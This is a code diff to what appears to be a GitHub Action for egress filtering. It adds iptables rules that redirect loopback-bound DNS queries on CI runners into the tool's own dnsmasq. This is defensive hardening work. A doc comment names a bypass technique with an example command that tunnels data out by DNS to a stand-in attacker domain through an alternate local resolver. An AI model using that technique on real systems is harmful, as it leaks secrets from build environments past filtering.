@@ -415,6 +415,8 @@ async function run() {
         // Configure iptables rules with Main- log prefix
         core.info('Configuring iptables rules...');
         await (0, setup_1.setupFirewallRules)(dnsUser.uid, 'Main-');
+        // Force loopback-destined DNS (e.g. GitHub's egress resolver) through our dnsmasq
+        await (0, setup_1.setupDnsInterception)(dnsUser.uid);
         // Configure DNS filtering
         core.info('Configuring DNS filtering...');
         await (0, setup_1.setupDNSConfig)();
@@ -945,6 +947,7 @@ exports.createRandomDNSUser = createRandomDNSUser;
 exports.setupIpsets = setupIpsets;
 exports.setupIptablesLogging = setupIptablesLogging;
 exports.setupFirewallRules = setupFirewallRules;
+exports.setupDnsInterception = setupDnsInterception;
 exports.setupDNSConfig = setupDNSConfig;
 exports.setupDNSMasq = setupDNSMasq;
 exports.startDnsmasq = startDnsmasq;
@@ -1241,6 +1244,62 @@ async function setupFirewallRules(dnsUid, logPrefix = '', primaryDnsServer = dns
             '-j',
             'DROP'
         ]);
+    }
+}
+/**
+ * Force all loopback-destined DNS through our dnsmasq so it cannot be used to bypass
+ * filtering.
+ *
+ * On some GitHub-hosted runners a second resolver listens on a loopback address other
+ * than ours - systemd-resolved on 127.0.0.53, or GitHub's egress DNS resolver on
+ * 127.0.0.100 (see actions/runner-images#14925). A workflow could query that resolver
+ * directly (e.g. `dig @127.0.0.100 <data>.attacker.com`) to tunnel data out, bypassing
+ * our dnsmasq entirely. This adds a nat OUTPUT REDIRECT that sends any UDP/TCP :53
+ * destined for a loopback address (other than our own dnsmasq on 127.0.0.1) to our
+ * dnsmasq instead, so it is filtered in enforce mode and logged in analyze mode.
+ *
+ * External (non-loopback) direct-IP DNS is handled by the OUTPUT DROP from
+ * finalizeFirewallRules() in enforce mode; it is intentionally NOT redirected here,
+ * because a redirect of an eth0-sourced packet to 127.0.0.1 would be a martian packet
+ * the kernel drops.
+ *
+ * Exemptions:
+ * - our dnsmasq's own uid, so its upstream queries to the configured DNS servers are
+ *   not redirected back into itself (which would loop);
+ * - traffic already destined for 127.0.0.1 (our dnsmasq), which needs no redirect.
+ *
+ * Idempotent: safe to call in both the pre-hook and the main action (deletes any prior
+ * copy before inserting). Inserted at position 1 so it runs before any resolver
+ * redirect the runner image ships.
+ *
+ * @param dnsUid - UID of the DNS user (dnsmasq runs as this user)
+ */
+async function setupDnsInterception(dnsUid) {
+    const uid = dnsUid.toString();
+    for (const proto of ['udp', 'tcp']) {
+        const rule = [
+            '-p',
+            proto,
+            '--dport',
+            '53',
+            '-m',
+            'owner',
+            '!',
+            '--uid-owner',
+            uid,
+            '-d',
+            '127.0.0.0/8',
+            '!',
+            '-d',
+            '127.0.0.1',
+            '-j',
+            'REDIRECT',
+            '--to-ports',
+            '53'
+        ];
+        // Delete any prior copy first so repeated calls don't stack duplicates
+        await exec.exec('sudo', ['iptables', '-t', 'nat', '-D', 'OUTPUT', ...rule], { ignoreReturnCode: true });
+        await exec.exec('sudo', ['iptables', '-t', 'nat', '-I', 'OUTPUT', '1', ...rule]);
     }
 }
 async function setupDNSConfig() {
